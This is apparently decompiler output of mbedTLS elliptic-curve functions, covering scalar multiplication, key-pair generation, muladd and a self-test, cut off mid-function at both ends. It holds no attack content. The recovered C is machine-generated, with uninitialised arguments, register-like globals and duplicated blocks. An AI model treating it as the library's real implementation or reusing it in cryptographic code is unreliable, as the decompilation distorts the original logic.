                                                                                                                                                                                    v65 = v94;
                                                                                                                                                                                }
                                                                                                                                                                            } else {
                                                                                                                                                                                v65 = v93;
                                                                                                                                                                            }
                                                                                                                                                                        } else {
                                                                                                                                                                            v65 = v92;
                                                                                                                                                                        }
                                                                                                                                                                    } else {
                                                                                                                                                                        v65 = v91;
                                                                                                                                                                    }
                                                                                                                                                                } else {
                                                                                                                                                                    v65 = v90;
                                                                                                                                                                }
                                                                                                                                                            }
                                                                                                                                                        } else {
                                                                                                                                                            v65 = v88;
                                                                                                                                                        }
                                                                                                                                                    } else {
                                                                                                                                                        v65 = v87;
                                                                                                                                                    }
                                                                                                                                                } else {
                                                                                                                                                    v65 = v86;
                                                                                                                                                }
                                                                                                                                            } else {
                                                                                                                                                v65 = v83;
                                                                                                                                            }
                                                                                                                                        } else {
                                                                                                                                            v65 = v82;
                                                                                                                                        }
                                                                                                                                    } else {
                                                                                                                                        v65 = v80;
                                                                                                                                    }
                                                                                                                                } else {
                                                                                                                                    v65 = v79;
                                                                                                                                }
                                                                                                                            } else {
                                                                                                                                v65 = v78;
                                                                                                                            }
                                                                                                                        } else {
                                                                                                                            v65 = v77;
                                                                                                                        }
                                                                                                                    }
                                                                                                                } else {
                                                                                                                    v65 = v75;
                                                                                                                }
                                                                                                            } else {
                                                                                                                int32_t v106 = mbedtls_mpi_sub_abs(&v41, v31, g7); // 0x805eaba
                                                                                                                g1 = v106;
                                                                                                                if (v106 != 0) {
                                                                                                                    v65 = v106;
                                                                                                                    // break -> 0x805e81a
                                                                                                                    break;
                                                                                                                }
                                                                                                                // continue -> 0x805ea99
                                                                                                                continue;
                                                                                                            }
                                                                                                            // 0x805e81a
                                                                                                            g1 = mbedtls_mpi_free(&v46);
                                                                                                            g1 = mbedtls_mpi_free(&v47);
                                                                                                            g1 = mbedtls_mpi_free(&v48);
                                                                                                            g1 = mbedtls_mpi_free(&v49);
                                                                                                            g1 = mbedtls_mpi_free(&v40);
                                                                                                            g1 = mbedtls_mpi_free(&v41);
                                                                                                            g1 = mbedtls_mpi_free(&v42);
                                                                                                            g1 = mbedtls_mpi_free(&v43);
                                                                                                            mbedtls_mpi_free(&v44);
                                                                                                            g1 = v65;
                                                                                                            result = v65;
                                                                                                            // branch -> 0x805e4f0
                                                                                                            // 0x805e4f0
                                                                                                            g1 = mbedtls_ecp_point_free(g5);
                                                                                                            mbedtls_mpi_free(&v11);
                                                                                                            g1 = result;
                                                                                                            // branch -> 0x805e457
                                                                                                            // 0x805e457
                                                                                                            g3 = v1;
                                                                                                            g7 = v2;
                                                                                                            g5 = v3;
                                                                                                            g2 = v4;
                                                                                                            return result;
                                                                                                        }
                                                                                                        // 0x805e81a
                                                                                                        g1 = mbedtls_mpi_free(&v46);
                                                                                                        g1 = mbedtls_mpi_free(&v47);
                                                                                                        g1 = mbedtls_mpi_free(&v48);
                                                                                                        g1 = mbedtls_mpi_free(&v49);
                                                                                                        g1 = mbedtls_mpi_free(&v40);
                                                                                                        g1 = mbedtls_mpi_free(&v41);
                                                                                                        g1 = mbedtls_mpi_free(&v42);
                                                                                                        g1 = mbedtls_mpi_free(&v43);
                                                                                                        mbedtls_mpi_free(&v44);
                                                                                                        g1 = v65;
                                                                                                        result = v65;
                                                                                                        // branch -> 0x805e4f0
                                                                                                        // 0x805e4f0
                                                                                                        g1 = mbedtls_ecp_point_free(g5);
                                                                                                        mbedtls_mpi_free(&v11);
                                                                                                        g1 = result;
                                                                                                        // branch -> 0x805e457
                                                                                                        // 0x805e457
                                                                                                        g3 = v1;
                                                                                                        g7 = v2;
                                                                                                        g5 = v3;
                                                                                                        g2 = v4;
                                                                                                        return result;
                                                                                                    }
                                                                                                }
                                                                                            } else {
                                                                                                v65 = v72;
                                                                                            }
                                                                                        } else {
                                                                                            v65 = v71;
                                                                                        }
                                                                                    } else {
                                                                                        v65 = v70;
                                                                                    }
                                                                                }
                                                                            } else {
                                                                                v65 = v68;
                                                                            }
                                                                        } else {
                                                                            v65 = v67;
                                                                        }
                                                                    } else {
                                                                        v65 = v66;
                                                                    }
                                                                } else {
                                                                    int32_t v107 = mbedtls_mpi_sub_abs(&v46, v26, g7); // 0x805e811
                                                                    g1 = v107;
                                                                    if (v107 != 0) {
                                                                        v65 = v107;
                                                                        // break -> 0x805e81a
                                                                        break;
                                                                    }
                                                                    // continue -> 0x805e7ec
                                                                    continue;
                                                                }
                                                                // 0x805e81a
                                                                g1 = mbedtls_mpi_free(&v46);
                                                                g1 = mbedtls_mpi_free(&v47);
                                                                g1 = mbedtls_mpi_free(&v48);
                                                                g1 = mbedtls_mpi_free(&v49);
                                                                g1 = mbedtls_mpi_free(&v40);
                                                                g1 = mbedtls_mpi_free(&v41);
                                                                g1 = mbedtls_mpi_free(&v42);
                                                                g1 = mbedtls_mpi_free(&v43);
                                                                mbedtls_mpi_free(&v44);
                                                                g1 = v65;
                                                                result = v65;
                                                                // branch -> 0x805e4f0
                                                                // 0x805e4f0
                                                                g1 = mbedtls_ecp_point_free(g5);
                                                                mbedtls_mpi_free(&v11);
                                                                g1 = result;
                                                                // branch -> 0x805e457
                                                                // 0x805e457
                                                                g3 = v1;
                                                                g7 = v2;
                                                                g5 = v3;
                                                                g2 = v4;
                                                                return result;
                                                            }
                                                            // 0x805e81a
                                                            g1 = mbedtls_mpi_free(&v46);
                                                            g1 = mbedtls_mpi_free(&v47);
                                                            g1 = mbedtls_mpi_free(&v48);
                                                            g1 = mbedtls_mpi_free(&v49);
                                                            g1 = mbedtls_mpi_free(&v40);
                                                            g1 = mbedtls_mpi_free(&v41);
                                                            g1 = mbedtls_mpi_free(&v42);
                                                            g1 = mbedtls_mpi_free(&v43);
                                                            mbedtls_mpi_free(&v44);
                                                            g1 = v65;
                                                            result = v65;
                                                            // branch -> 0x805e4f0
                                                            // 0x805e4f0
                                                            g1 = mbedtls_ecp_point_free(g5);
                                                            mbedtls_mpi_free(&v11);
                                                            g1 = result;
                                                            // branch -> 0x805e457
                                                            // 0x805e457
                                                            g3 = v1;
                                                            g7 = v2;
                                                            g5 = v3;
                                                            g2 = v4;
                                                            return result;
                                                        }
                                                        result = v63;
                                                    } else {
                                                        result = v62;
                                                    }
                                                }
                                                // 0x805e4f0
                                                g1 = mbedtls_ecp_point_free(g5);
                                                mbedtls_mpi_free(&v11);
                                                g1 = result;
                                                // branch -> 0x805e457
                                                // 0x805e457
                                                g3 = v1;
                                                g7 = v2;
                                                g5 = v3;
                                                g2 = v4;
                                                return result;
                                            }
                                        } else {
                                            // 0x805e5bb
                                            v24 = &v46;
                                            v55 = (*(int32_t *)(v53 + 88) + 7) / 8;
                                            mbedtls_mpi_init(&v46);
                                            // branch -> 0x805e5df
                                            while (true) {
                                                // 0x805e5df
                                                g6 = v24;
                                                mbedtls_mpi_fill_random(v24, v55, (int32_t (*)(int32_t, int32_t, int32_t))a5, a6);
                                                // branch -> 0x805e602
                                              lab_0x805e602:;
                                                int32_t v108; // 0x805e639
                                                while (true) {
                                                    // 0x805e602
                                                    if (mbedtls_mpi_cmp_mpi(&v46, v23) >= 0) {
                                                        int32_t v109 = mbedtls_mpi_shift_r(v24, 1); // 0x805e62d
                                                        g1 = v109;
                                                        if (v109 != 0) {
                                                            v108 = v109;
                                                            // break -> 0x805e636
                                                            break;
                                                        }
                                                        // continue -> 0x805e602
                                                        continue;
                                                    }
                                                    // 0x805e9ce
                                                    if (mbedtls_mpi_cmp_int(v24, 1) > 0) {
                                                        int32_t v110 = g5; // 0x805e659
                                                        int32_t * v111 = (int32_t *)v110;
                                                        int32_t v112 = mbedtls_mpi_mul_mpi(v111, v111, &v46); // 0x805e660
                                                        g1 = v112;
                                                        v108 = v112;
                                                        if (v112 == 0) {
                                                            // 0x805e669
                                                            g6 = g3;
                                                            g1 = v10;
                                                            int32_t v113 = ecp_modp(v110, v110); // 0x805e66d
                                                            g1 = v113;
                                                            if (v113 == 0) {
                                                                int32_t v114 = &v45; // 0x805e676_0
                                                                g216++;
                                                                int32_t v115 = mbedtls_mpi_mul_mpi(&v45, &v45, &v46); // 0x805e697
                                                                g1 = v115;
                                                                g4 = v114;
                                                                if (v115 == 0) {
                                                                    // 0x805e6a6
                                                                    g6 = g3;
                                                                    g1 = v114;
                                                                    int32_t v116 = ecp_modp(v114, v114); // 0x805e6aa
                                                                    g1 = v116;
                                                                    if (v116 == 0) {
                                                                        // 0x805e6b3
                                                                        g1 = v24;
                                                                        g216++;
                                                                        mbedtls_mpi_free(&v46);
                                                                        v26 = v24;
                                                                        v25 = v114;
                                                                        // branch -> 0x805e6c5
                                                                        // 0x805e6c5
                                                                        v35 = mbedtls_mpi_bitlen(g7, v114);
                                                                        g7 = v21;
                                                                        v54 = g3 + 16;
                                                                        v50 = (int32_t *)a2;
                                                                        v51 = (int32_t *)v16;
                                                                        v27 = &v47;
                                                                        v28 = &v48;
                                                                        v29 = &v49;
                                                                        v30 = &v40;
                                                                        v31 = &v41;
                                                                        v32 = &v42;
                                                                        v33 = &v43;
                                                                        v34 = &v44;
                                                                        v52 = (int32_t *)v25;
                                                                        v56 = v35;
                                                                        // branch -> 0x805e6e8
                                                                        while (true) {
                                                                            // 0x805e6e8
                                                                            if (v56 != 0) {
                                                                                goto lab_0x805e6f6_2;
                                                                            }
                                                                            // 0x805e9f5
                                                                            v36 = mbedtls_mpi_inv_mod(v16, v16, v21);
                                                                            g1 = v36;
                                                                            result = v36;
                                                                            if (v36 == 0) {
                                                                                // 0x805ea19
                                                                                v37 = mbedtls_mpi_mul_mpi(v50, v50, v51);
                                                                                g1 = v37;
                                                                                if (v37 == 0) {
                                                                                    // 0x805ea3a
                                                                                    g1 = a2;
                                                                                    g6 = g3;
                                                                                    v38 = ecp_modp(a2, a2);
                                                                                    g1 = v38;
                                                                                    if (v38 == 0) {
                                                                                        // 0x805ea4c
                                                                                        g216++;
                                                                                        v39 = mbedtls_mpi_lset(v17, 1);
                                                                                        g1 = v39;
                                                                                        result = v39;
                                                                                        // branch -> 0x805e4f0
                                                                                        // 0x805e4f0
                                                                                        g1 = mbedtls_ecp_point_free(g5);
                                                                                        mbedtls_mpi_free(&v11);
                                                                                        g1 = result;
                                                                                        // branch -> 0x805e457
                                                                                        // 0x805e457
                                                                                        g3 = v1;
                                                                                        g7 = v2;
                                                                                        g5 = v3;
                                                                                        g2 = v4;
                                                                                        return result;
                                                                                    }
                                                                                    result = v38;
                                                                                } else {
                                                                                    result = v37;
                                                                                }
                                                                            }
                                                                            // 0x805e4f0
                                                                            g1 = mbedtls_ecp_point_free(g5);
                                                                            mbedtls_mpi_free(&v11);
                                                                            g1 = result;
                                                                            // branch -> 0x805e457
                                                                            // 0x805e457
                                                                            g3 = v1;
                                                                            g7 = v2;
                                                                            g5 = v3;
                                                                            g2 = v4;
                                                                            return result;
                                                                        }
                                                                    } else {
                                                                        v108 = v116;
                                                                    }
                                                                } else {
                                                                    v108 = v115;
                                                                }
                                                            } else {
                                                                v108 = v113;
                                                            }
                                                        }
                                                        // 0x805e636
                                                        mbedtls_mpi_free(&v46);
                                                        g1 = v108;
                                                        result = v108;
                                                        // branch -> 0x805e4f0
                                                        // 0x805e4f0
                                                        g1 = mbedtls_ecp_point_free(g5);
                                                        mbedtls_mpi_free(&v11);
                                                        g1 = result;
                                                        // branch -> 0x805e457
                                                        // 0x805e457
                                                        g3 = v1;
                                                        g7 = v2;
                                                        g5 = v3;
                                                        g2 = v4;
                                                        return result;
                                                    }
                                                    // 0x805e9e9
                                                    // branch -> 0x805e5df
                                                    break;
                                                }
                                                // 0x805e636
                                                mbedtls_mpi_free(&v46);
                                                g1 = v108;
                                                result = v108;
                                                // branch -> 0x805e4f0
                                                // 0x805e4f0
                                                g1 = mbedtls_ecp_point_free(g5);
                                                mbedtls_mpi_free(&v11);
                                                g1 = result;
                                                // branch -> 0x805e457
                                                // 0x805e457
                                                g3 = v1;
                                                g7 = v2;
                                                g5 = v3;
                                                g2 = v4;
                                                return result;
                                            }
                                        }
                                    }
                                    // 0x805e5a9
                                    v53 = g7;
                                    g3 = v53;
                                    g7 = v22;
                                    if (a5 == 0) {
                                        // 0x805e5a9
                                        v26 = &v46;
                                        v25 = &v45;
                                        // branch -> 0x805e6c5
                                        // 0x805e6c5
                                        v35 = mbedtls_mpi_bitlen(v22, v21);
                                        g7 = v21;
                                        v54 = g3 + 16;
                                        v50 = (int32_t *)a2;
                                        v51 = (int32_t *)v16;
                                        v27 = &v47;
                                        v28 = &v48;
                                        v29 = &v49;
                                        v30 = &v40;
                                        v31 = &v41;
                                        v32 = &v42;
                                        v33 = &v43;
                                        v34 = &v44;
                                        v52 = (int32_t *)v25;
                                        v56 = v35;
                                        // branch -> 0x805e6e8
                                      lab_0x805e6e8:
                                        while (true) {
                                            // 0x805e6e8
                                            if (v56 != 0) {
                                                goto lab_0x805e6f6_2;
                                            }
                                            // 0x805e9f5
                                            v36 = mbedtls_mpi_inv_mod(v16, v16, v21);
                                            g1 = v36;
                                            if (v36 == 0) {
                                                // 0x805ea19
                                                v37 = mbedtls_mpi_mul_mpi(v50, v50, v51);
                                                g1 = v37;
                                                if (v37 == 0) {
                                                    // 0x805ea3a
                                                    g1 = a2;
                                                    g6 = g3;
                                                    v38 = ecp_modp(a2, a2);
                                                    g1 = v38;
                                                    if (v38 == 0) {
                                                        // 0x805ea4c
                                                        g216++;
                                                        v39 = mbedtls_mpi_lset(v17, 1);
                                                        g1 = v39;
                                                        result = v39;
                                                        // branch -> 0x805e4f0
                                                        // 0x805e4f0
                                                        g1 = mbedtls_ecp_point_free(g5);
                                                        mbedtls_mpi_free(&v11);
                                                        g1 = result;
                                                        // branch -> 0x805e457
                                                        // 0x805e457
                                                        g3 = v1;
                                                        g7 = v2;
                                                        g5 = v3;
                                                        g2 = v4;
                                                        return result;
                                                    }
                                                    result = v38;
                                                } else {
                                                    result = v37;
                                                }
                                            } else {
                                                result = v36;
                                            }
                                        }
                                    } else {
                                        // 0x805e5bb
                                        v24 = &v46;
                                        v55 = (*(int32_t *)(v53 + 88) + 7) / 8;
                                        mbedtls_mpi_init(&v46);
                                        // branch -> 0x805e5df
                                        while (true) {
                                            // 0x805e5df
                                            g6 = v24;
                                            mbedtls_mpi_fill_random(v24, v55, (int32_t (*)(int32_t, int32_t, int32_t))a5, a6);
                                            // branch -> 0x805e602
                                            goto lab_0x805e602;
                                        }
                                    }
                                    // 0x805e4f0
                                    g1 = mbedtls_ecp_point_free(g5);
                                    mbedtls_mpi_free(&v11);
                                    g1 = result;
                                    // branch -> 0x805e457
                                    // 0x805e457
                                    g3 = v1;
                                    g7 = v2;
                                    g5 = v3;
                                    g2 = v4;
                                    return result;
                                }
                                result = v18;
                            } else {
                                result = v15;
                            }
                        } else {
                            result = v14;
                        }
                    }
                  lab_0x805e4f0:
                    // 0x805e4f0
                    g1 = mbedtls_ecp_point_free(g5);
                    mbedtls_mpi_free(&v11);
                    g1 = result;
                    result2 = result;
                    // branch -> 0x805e457
                } else {
                    // 0x805e499
                    g1 = v7;
                    int32_t v117;
                    int32_t v118;
                    int32_t v119;
                    ecp_mul_comb((char *)a4, a5, a6, v119, v118, v117);
                    g1 = -0x4f80;
                    result2 = -0x4f80;
                    // branch -> 0x805e457
                }
                // 0x805e457
                g3 = v1;
                g7 = v2;
                g5 = v3;
                g2 = v4;
                return result2;
            }
            result2 = v6;
        } else {
            result2 = v5;
        }
    } else {
        // 0x805e452
        g1 = -0x4f80;
        result2 = -0x4f80;
        // branch -> 0x805e457
    }
    // 0x805e457
    g3 = v1;
    g7 = v2;
    g5 = v3;
    g2 = v4;
    return result2;
}

// Address range: 0x805eec0 - 0x805f0af
int32_t mbedtls_ecp_gen_keypair(int32_t a1, int32_t a2, int32_t a3, int32_t (*a4)(int32_t, int32_t, int32_t), int32_t a5) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g5; // 0x805eec8
    int32_t v3 = g7; // 0x805eec9
    int32_t v4 = g3; // 0x805eeca
    g3 = a1;
    g7 = a2;
    int32_t * v5 = (int32_t *)(a1 + 92); // 0x805eeda_0
    if (*(int32_t *)(a1 + 48) == 0) {
        // 0x805f06e
        g3 = v4;
        g7 = v3;
        g5 = v2;
        return -0x4f80;
    }
    int32_t v6 = (*v5 + 7) / 8; // 0x805eeeb
    g5 = v6;
    int32_t result3; // 0x805f078_2
    int32_t v7; // 0x805f050
    if (*(int32_t *)(a1 + 60) == 0) {
        // 0x805efa8
        g6 = a5;
        int32_t v8 = mbedtls_mpi_fill_random(a2, v6, a4, a5); // 0x805efbd
        if (v8 == 0) {
            int32_t v9 = mbedtls_mpi_bitlen(g7, v6); // 0x805efcd
            uint32_t v10 = *(int32_t *)(g3 + 92); // 0x805efd2
            uint32_t v11 = v9 - 1; // 0x805efd5
            if (v11 > v10) {
                int32_t result = mbedtls_mpi_shift_r(g7, v11 - v10); // 0x805efe9
                if (result != 0) {
                    // 0x805f06e
                    g3 = v4;
                    g7 = v3;
                    g5 = v2;
                    return result;
                }
            } else {
                int32_t result2 = mbedtls_mpi_set_bit(g7, v10, 1); // 0x805f08f
                if (result2 != 0) {
                    // 0x805f06e
                    g3 = v4;
                    g7 = v3;
                    g5 = v2;
                    return result2;
                }
            }
            int32_t v12 = mbedtls_mpi_set_bit(g7, 0, 0); // 0x805f005
            if (v12 == 0) {
                int32_t v13 = mbedtls_mpi_set_bit(g7, 1, 0); // 0x805f021
                if (v13 == 0) {
                    int32_t v14 = mbedtls_mpi_set_bit(g7, 2, 0); // 0x805f03d
                    if (v14 == 0) {
                        // 0x805f02a
                        v7 = g3;
                        // branch -> 0x805f046
                        // 0x805f046
                        result3 = mbedtls_ecp_mul(v7, a3, g7, v7 + 40, (int32_t)a4, a5);
                        // branch -> 0x805f06e
                    } else {
                        result3 = v14;
                    }
                } else {
                    result3 = v13;
                }
            } else {
                result3 = v12;
            }
        } else {
            result3 = v8;
        }
    } else {
        // 0x805eef6
        g237 = true;
        g3 = v6;
        g5 = 0;
        int32_t v15;
        int32_t v16 = &v15; // 0x805ef13_0
        g6 = a5;
        g1 = v16;
        a4(a5, v16, v6);
        int32_t v17 = g1; // 0x805ef2434
        if (v17 == 0) {
            while (true) {
                int32_t v18 = mbedtls_mpi_read_binary(g7, (char *)&v15, g3); // 0x805ef3a
                if (v18 == 0) {
                    int32_t v19 = mbedtls_mpi_shift_r(g7, 8 * v6 - *v5); // 0x805ef57
                    if (v19 == 0) {
                        int32_t v20 = g5 + 1; // 0x805ef64
                        g5 = v20;
                        if (v20 == 31) {
                            // 0x805f0a0
                            // branch -> 0x805f06e
                            // 0x805f06e
                            g3 = v4;
                            g7 = v3;
                            g5 = v2;
                            return -0x4d00;
                        }
                        uint32_t v21 = mbedtls_mpi_cmp_int(g7, 1); // 0x805ef7b
                        g237 = v21 == 0;
                        if (v21 >= 0) {
                            uint32_t v22 = mbedtls_mpi_cmp_mpi((int32_t *)g7, (int32_t *)(a1 + 76)); // 0x805ef8e
                            g237 = v22 == 0;
                            if (v22 <= 0) {
                                // 0x805ef9b
                                g3 = a1;
                                v7 = a1;
                                // branch -> 0x805f046
                                // 0x805f046
                                result3 = mbedtls_ecp_mul(v7, a3, g7, v7 + 40, (int32_t)a4, a5);
                                // branch -> 0x805f06e
                                // 0x805f06e
                                g3 = v4;
                                g7 = v3;
                                g5 = v2;
                                return result3;
                            }
                        }
                        // 0x805ef10
                        g6 = a5;
                        g1 = v16;
                        a4(a5, v16, g3);
                        int32_t v23 = g1; // 0x805ef24
                        if (v23 != 0) {
                            result3 = v23;
                            // break -> 0x805f06e
                            break;
                        }
                        // continue -> 0x805ef2c
                        continue;
                    } else {
                        result3 = v19;
                    }
                } else {
                    result3 = v18;
                }
            }
            // 0x805f06e
            g3 = v4;
            g7 = v3;
            g5 = v2;
            return result3;
        }
        result3 = v17;
    }
    // 0x805f06e
    g3 = v4;
    g7 = v3;
    g5 = v2;
    return result3;
}

// Address range: 0x805f0b0 - 0x805f0ff
int32_t mbedtls_ecp_gen_key(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x805f0b3
    g3 = a2;
    g1 = a1;
    int32_t v2;
    int32_t v3;
    int32_t v4;
    int32_t v5 = mbedtls_ecp_group_load((int32_t *)a2, a1, v4, v3, v2, 0, 0, 0, 0); // 0x805f0c4
    g1 = v5;
    int32_t result = v5; // 0x805f0f9_2
    if (v5 == 0) {
        int32_t v6 = g3; // 0x805f0d0
        int32_t v7 = mbedtls_ecp_gen_keypair(v6, v6 + 124, v6 + 136, (int32_t (*)(int32_t, int32_t, int32_t))a3, a4); // 0x805f0ef
        g1 = v7;
        result = v7;
        // branch -> 0x805f0f4
    }
    // 0x805f0f4
    g3 = v1;
    int32_t v8;
    g2 = v8;
    return result;
}

// Address range: 0x805f100 - 0x805f1df
int32_t mbedtls_ecp_muladd(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g3; // 0x805f106
    g3 = a1;
    int32_t v2 = g5; // 0x805f10c
    g5 = a2;
    int32_t v3 = g7; // 0x805f112
    int32_t v4;
    if (*(int32_t *)(a1 + 48) == 0) {
        // 0x805f178
        g3 = v1;
        g1 = -0x4e80;
        g7 = v3;
        g5 = v2;
        g2 = v4;
        return -0x4e80;
    }
    int32_t v5 = *(int32_t *)(a1 + 60); // 0x805f11c
    g4 = v5;
    if (v5 == 0) {
        // 0x805f178
        g3 = v1;
        g1 = -0x4e80;
        g7 = v3;
        g5 = v2;
        g2 = v4;
        return -0x4e80;
    }
    // 0x805f123
    int32_t v6;
    int32_t v7 = &v6; // 0x805f123_0
    g7 = v7;
    mbedtls_ecp_point_init(v7);
    int32_t v8 = mbedtls_ecp_mul(g3, g7, a3, a4, 0, 0); // 0x805f153
    g1 = v8;
    int32_t result = v8; // 0x805f15f
    if (v8 == 0) {
        int32_t v9 = g5; // 0x805f1a3
        int32_t v10 = mbedtls_ecp_mul(g3, v9, a5, a6, 0, 0); // 0x805f1b5
        g1 = v10;
        if (v10 == 0) {
            // 0x805f1be
            g4 = v7;
            int32_t v11 = g5; // 0x805f1c0
            g6 = v11;
            g1 = g3;
            int32_t v12 = ecp_add_mixed(v11, v9, a5, a6); // 0x805f1c7
            g1 = v12;
            if (v12 == 0) {
                // 0x805f1d0
                g6 = g5;
                g1 = g3;
                int32_t v13 = ecp_normalize_jac(v11, v9); // 0x805f1d4
                g1 = v13;
                result = v13;
                // branch -> 0x805f15c
            } else {
                result = v12;
            }
        } else {
            result = v10;
        }
    }
    // 0x805f15c
    mbedtls_ecp_point_free(g7);
    g1 = result;
    g3 = v1;
    g7 = v3;
    g5 = v2;
    g2 = v4;
    return result;
}

// Address range: 0x805f1e0 - 0x805f1ff
int32_t mbedtls_ecp_group_init(char * a1) {
    // 0x805f1e0
    if (a1 != NULL) {
        // 0x805f1eb
        // branch -> 0x805f1f6
    }
    // 0x805f1f6
    g4 = (int32_t)memset(a1, 0, 31);
    int32_t v1;
    g2 = v1;
    return 0;
}

// Address range: 0x805f200 - 0x805f6af
int32_t mbedtls_ecp_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x805f203
    int32_t v2 = g7; // 0x805f204
    int32_t v3 = g3; // 0x805f205
    int32_t v4;
    g7 = &v4;
    int32_t v5;
    g5 = &v5;
    mbedtls_ecp_group_init((char *)&v4);
    int32_t v6;
    int32_t v7 = &v6; // 0x805f247_0
    mbedtls_ecp_point_init(v7);
    int32_t v8;
    int32_t v9 = &v8; // 0x805f252_0
    mbedtls_ecp_point_init(v9);
    g1 = mbedtls_mpi_init((int32_t *)g5);
    int32_t v10;
    int32_t v11;
    int32_t v12;
    int32_t v13;
    int32_t v14 = mbedtls_ecp_group_load((int32_t *)g7, 1, v13, v12, v11, v10, 0, 0, 0); // 0x805f273
    g1 = v14;
    g3 = v7;
    int32_t v15 = v7; // 0x805f2ef
    int32_t result; // 0x805f2dd
    int32_t result2; // 0x805f33a
    int32_t v16; // 0x805f2e8
    if (v14 == 0) {
        // 0x805f27e
        g3 = a1;
        if (a1 != 0) {
            // 0x805f4d8
            printf("  ECP test #1 (constant op_count, base point G): ");
            // branch -> 0x805f289
        }
        int32_t v17 = mbedtls_mpi_lset((char *)g5, 2); // 0x805f294
        g1 = v17;
        g3 = v7;
        if (v17 == 0) {
            // 0x805f348
            int32_t v18;
            int32_t v19 = &v18; // 0x805f348_0
            int32_t v20 = mbedtls_ecp_mul(g7, v9, g5, v19, 0, 0); // 0x805f373
            g1 = v20;
            g3 = v19;
            if (v20 == 0) {
                // 0x805f382
                g214 = 0;
                g215 = 0;
                g216 = 0;
                int32_t v21 = mbedtls_mpi_read_string((char *)g5, 16, "000000000000000000000000000000000000000000000001"); // 0x805f3b3
                g1 = v21;
                g3 = v19;
                if (v21 == 0) {
                    int32_t v22 = mbedtls_ecp_mul(g7, v7, g5, v19, 0, 0); // 0x805f3ea
                    g1 = v22;
                    g3 = v19;
                    if (v22 == 0) {
                        int32_t v23 = g214; // 0x805f3f9
                        int32_t v24;
                        int32_t v25 = &v24; // 0x805f3fe_0
                        g3 = v25;
                        int32_t v26 = g215; // 0x805f400
                        int32_t v27 = g216; // 0x805f40c
                        g214 = 0;
                        g215 = 0;
                        g216 = 0;
                        int32_t v28 = mbedtls_mpi_read_string((char *)g5, 16, "FFFFFFFFFFFFFFFFFFFFFFFF99DEF836146BC9B1B4D22830"); // 0x805f44f82
                        g1 = v28;
                        int32_t v29 = v28; // 0x805f668
                        if (v28 == 0) {
                            while (true) {
                                int32_t v30 = mbedtls_ecp_mul(g7, v7, g5, v19, 0, 0); // 0x805f484
                                g1 = v30;
                                if (v30 == 0) {
                                    // 0x805f491
                                    int32_t v31; // 0x805f68c
                                    if (g214 == v23) {
                                        // 0x805f4a3
                                        g1 = v26;
                                        if (g215 == v26) {
                                            // 0x805f4b5
                                            if (g216 == v27) {
                                                int32_t v32 = g3 + 1; // 0x805f4c7
                                                g3 = v32;
                                                if (v32 == 6) {
                                                    // 0x805f4e9
                                                    if (a1 != 0) {
                                                        // 0x805f64b
                                                        puts("passed");
                                                        printf("  ECP test #2 (constant op_count, other point): ");
                                                        // branch -> 0x805f4f4
                                                    }
                                                    // 0x805f4f4
                                                    g214 = 0;
                                                    g215 = 0;
                                                    g216 = 0;
                                                    int32_t v33 = mbedtls_mpi_read_string((char *)g5, 16, "000000000000000000000000000000000000000000000001"); // 0x805f525
                                                    g1 = v33;
                                                    g3 = v33;
                                                    if (v33 == 0) {
                                                        int32_t v34 = mbedtls_ecp_mul(g7, v7, g5, v9, 0, 0); // 0x805f55c
                                                        g1 = v34;
                                                        g3 = v9;
                                                        if (v34 == 0) {
                                                            int32_t v35 = g214; // 0x805f56b
                                                            g3 = v25;
                                                            int32_t v36 = g215; // 0x805f572
                                                            int32_t v37 = g216; // 0x805f57e
                                                            g214 = 0;
                                                            g215 = 0;
                                                            g216 = 0;
                                                            int32_t v38 = mbedtls_mpi_read_string((char *)g5, 16, "FFFFFFFFFFFFFFFFFFFFFFFF99DEF836146BC9B1B4D22830"); // 0x805f5c177
                                                            g1 = v38;
                                                            v29 = v38;
                                                            if (v38 == 0) {
                                                                while (true) {
                                                                    int32_t v39 = mbedtls_ecp_mul(g7, v7, g5, v9, 0, 0); // 0x805f5f6
                                                                    g1 = v39;
                                                                    if (v39 == 0) {
                                                                        // 0x805f5ff
                                                                        if (g214 == v35) {
                                                                            // 0x805f60d
                                                                            if (g215 == v36) {
                                                                                // 0x805f61b
                                                                                if (g216 == v37) {
                                                                                    int32_t v40 = g3 + 1; // 0x805f629
                                                                                    g3 = v40;
                                                                                    if (v40 == 6) {
                                                                                        // 0x805f66f
                                                                                        g3 = v7;
                                                                                        if (a1 != 0) {
                                                                                            // 0x805f67b
                                                                                            g1 = puts("passed");
                                                                                            // branch -> 0x805f2a7
                                                                                        }
                                                                                    } else {
                                                                                        int32_t v41 = *(int32_t *)(4 * v40 - 60 + g2); // 0x805f631
                                                                                        g214 = 0;
                                                                                        g215 = 0;
                                                                                        g216 = 0;
                                                                                        int32_t v42 = mbedtls_mpi_read_string((char *)g5, 16, (char *)v41); // 0x805f5c1
                                                                                        g1 = v42;
                                                                                        if (v42 != 0) {
                                                                                            v29 = v42;
                                                                                            // break -> 0x805f668
                                                                                            break;
                                                                                        }
                                                                                        // continue -> 0x805f5ce
                                                                                        continue;
                                                                                    }
                                                                                    // 0x805f2a7
                                                                                    mbedtls_ecp_group_free((char *)g7);
                                                                                    g1 = v7;
                                                                                    g1 = mbedtls_ecp_point_free(v7);
                                                                                    g1 = mbedtls_ecp_point_free(v9);
                                                                                    mbedtls_mpi_free((int32_t *)g5);
                                                                                    if (a1 == 0) {
                                                                                        // 0x805f2d7
                                                                                        result = g3;
                                                                                        g1 = result;
                                                                                        g3 = v3;
                                                                                        g7 = v2;
                                                                                        g5 = v1;
                                                                                        return result;
                                                                                    }
                                                                                    // 0x805f328
                                                                                    putchar(10);
                                                                                    result2 = g3;
                                                                                    g1 = result2;
                                                                                    g3 = v3;
                                                                                    g7 = v2;
                                                                                    g5 = v1;
                                                                                    return result2;
                                                                                }
                                                                            }
                                                                        }
                                                                        // 0x805f63a
                                                                        if (a1 == 0) {
                                                                            // 0x805f641
                                                                            g3 = 1;
                                                                            // branch -> 0x805f2a7
                                                                        } else {
                                                                            // 0x805f68c
                                                                            v31 = g3;
                                                                            g3 = 1;
                                                                            g1 = printf("failed (%u)\n", v31);
                                                                            // branch -> 0x805f2a7
                                                                        }
                                                                        // 0x805f2a7
                                                                        mbedtls_ecp_group_free((char *)g7);
                                                                        g1 = v7;
                                                                        g1 = mbedtls_ecp_point_free(v7);
                                                                        g1 = mbedtls_ecp_point_free(v9);
